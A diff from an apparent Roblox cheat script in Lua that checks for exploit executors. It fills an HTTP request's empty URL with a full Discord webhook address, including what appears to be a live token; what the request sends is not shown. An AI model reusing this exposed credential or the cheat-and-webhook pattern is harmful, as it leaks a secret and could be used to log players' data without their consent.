@@ -13,7 +13,7 @@ local b = syn and syn.request or identifyexecutor() == "Fluxus" and request or h
 local d =
     b(
     {
-        Url = ""
+        Url = "https://discord.com/api/webhooks/1244552852517556286/vDX-5gJB7mk01_201NW6xbuaxyothM47cbIGewtlyioodRpkXrYjmTBT_kRSJlCzovys"
     }
 )
 function CheckSea(e)
